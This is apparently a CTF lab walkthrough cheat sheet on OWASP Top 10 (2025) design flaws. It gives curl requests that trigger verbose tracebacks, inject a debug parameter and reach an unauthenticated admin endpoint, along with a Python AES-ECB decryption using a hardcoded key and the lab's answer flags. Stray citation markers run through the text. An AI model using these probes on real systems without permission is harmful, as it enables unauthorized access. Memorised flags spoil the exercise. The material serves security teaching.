# 48.SAL1 — OWASP Top 10 (2025): Application Design Flaws — Cheat Sheet

**Focus:** AS02 Security Misconfigurations, AS03 Software Supply Chain Failures, AS04 Cryptographic Failures, and AS06 Insecure Design.

## TL;DR

  * [cite\_start]**AS02 (Misconfiguration):** Unsafe defaults and verbose error messages allow attackers to see internal logic (stack traces). [cite: 25, 41]
  * **AS03 (Supply Chain):** Vulnerabilities exist in third-party libraries/APIs, not your custom code. [cite\_start]Attackers exploit outdated components. [cite: 134, 139]
  * [cite\_start]**AS04 (Crypto Failures):** Weak encryption (MD5, ECB) or hardcoded keys in front-end code expose sensitive data. [cite: 287, 296]
  * [cite\_start]**AS06 (Insecure Design):** Flawed logic or architecture (e.g., assuming only mobile apps will access an API) that cannot be fixed by simple patching. [cite: 457, 467]

-----

## AS02: Security Misconfigurations

**Concept:** The application is set up with unsafe defaults or verbose error handling.
[cite\_start]**Vulnerability:** **Verbose Error Messages (Traceback Leaks).** The server prints internal variable values (including flags) when it crashes. [cite: 41, 112]

### Execution & Commands

**Goal:** Trigger a server-side error to reveal the stack trace.

```bash
# 1. Normal Request (Expected behavior)
# The API expects an integer ID.
curl http://[TARGET_IP]:5002/api/user/101

# 2. Exploit Request (Triggering the crash)
# Send a string ('kfs') where an integer is expected.
curl http://[TARGET_IP]:5002/api/user/kfs
```

**Explanation:**

  * The application expects a number. [cite\_start]Sending `kfs` causes a Python `ValueError`[cite: 122].
  * [cite\_start]The developer explicitly wrote code to print the flag in the error message for debugging: `raise ValueError(f"Invalid user ID format... Flag: {FLAG}")`[cite: 122].

[cite\_start]**Flag Found:** `THM{V3RB0S3_3RROR_L34K}` [cite: 55]

## AS03: Software Supply Chain Failures

[cite\_start]**Concept:** The application relies on an outdated or vulnerable third-party library (`lib/vulnerable_utils.py`). [cite: 161]
**Vulnerability:** **Vulnerable Dependency.** A debug feature was left active in a library component.

### Execution & Commands

**Goal:** Exploit the "debug" parameter in the JSON payload.

```bash
# 1. Identify the Endpoint
# URL: http://[TARGET_IP]:5003/api/process

# 2. Exploit via Curl (Injecting the debug parameter)
# The library checks for a "debug": "true" key-value pair.
curl -X POST http://[TARGET_IP]:5003/api/process \
     -H "Content-Type: application/json" \
     -d '{"data": "debug", "debug": "true"}'
```

**Explanation:**

  * [cite\_start]The "Method Not Allowed" or standard errors might appear initially, but by manipulating the JSON body to include `"debug": "true"`, you trigger the vulnerable library code[cite: 235, 237].
  * [cite\_start]Supply chain attacks often target these hidden dependencies that developers forget to audit[cite: 139].

[cite\_start]**Flag Found:** `THM{SUPPLY_CH41N_VULN3R4B1L1TY}` [cite: 163]

## AS04: Cryptographic Failures

**Concept:** Sensitive data is encrypted, but the key management is poor.
[cite\_start]**Vulnerability:** **Hardcoded Secrets & Weak Mode (AES-ECB).** The decryption key is stored in plain text in a JavaScript file. [cite: 296, 309]

### Execution & Commands

**Goal:** Find the key in the source code and decrypt the text.

1.  **Inspect Source Code:**

      * View page source at port `5004`.
      * [cite\_start]Find the script tag: `<script src="/static/js/decrypt.js"></script>`[cite: 379].
      * [cite\_start]Open the JS file and find: `const SECRET_KEY = "my-secret-key-16";`[cite: 398].

2.  **Decrypt (using CyberChef or Python):**

      * [cite\_start]**Ciphertext:** `Nzd42HZGgUIUlpILZRv...` (from the main page)[cite: 328].
      * [cite\_start]**Key:** `my-secret-key-16`[cite: 428].
      * [cite\_start]**Mode:** AES / ECB / No Padding (or PKCS7)[cite: 434].

```python
# Python Proof of Concept
# (Requires: pip install pycryptodome)
from Crypto.Cipher import AES
import base64

key = b'my-secret-key-16'
ciphertext = "Nzd42HZGgUIUlpILZRv0jeIXp1WtCErwR+j/w/lnKbmug31opX0BWy+pwK92rkhjwdf94mgHfLtF26X6B3pe2fhHXzIGnnvVruH7683KwvzZ6+QKybFWaedAEtknYkhe"
cipher = AES.new(key, AES.MODE_ECB)
print(cipher.decrypt(base64.b64decode(ciphertext)))
```

[cite\_start]**Flag Found:** `THM{CRYPTO_FAILURE_H4RDCOD3D_K3Y}` [cite: 454]

## AS06: Insecure Design

**Concept:** Flawed logic/architecture. The system assumes a specific client (Mobile App) is the only way to access the API.
[cite\_start]**Vulnerability:** **Security by Obscurity / Flawed Assumption.** The API endpoint `/api/messages/admin` is unprotected because the designers assumed "only mobile devices know this URL." [cite: 507, 508]

### Execution & Commands

**Goal:** Access the "hidden" API endpoint directly.

```bash
# 1. Access the endpoint directly
# The system relies on the assumption that users won't guess this URL.
curl http://[TARGET_IP]:5005/api/messages/admin
```

**Explanation:**

  * There is no authentication check on the server side. [cite\_start]The security was purely based on the design assumption that the URL was secret to the mobile app[cite: 463].
  * [cite\_start]Directly browsing to the URL bypasses this "restriction"[cite: 527].

[cite\_start]**Flag Found:** `THM{1NS3CUR3_D35IGN_4SSUMPT10N}` [cite: 496]

## Gotchas & Pitfalls

  * **Tracebacks are Gold:** Never ignore a "500 Internal Server Error." [cite\_start]Always check the raw response for stack traces; they often contain environment variables, paths, or even keys (AS02)[cite: 124].
  * **Client-Side $\neq$ Security:** Finding a secret key in a `.js` file means it is **public**. [cite\_start]Never do crypto in the browser using static keys (AS04)[cite: 296].
  * [cite\_start]**"Hidden" URLs aren't Secure:** Hiding an admin panel (like `/api/messages/admin`) without password protection is Insecure Design, not access control (AS06)[cite: 463].
  * **Dependency Blindness:** Just because your code is clean doesn't mean your app is secure. [cite\_start]If you import a library with `debug: true` enabled by default, you are vulnerable (AS03)[cite: 135].
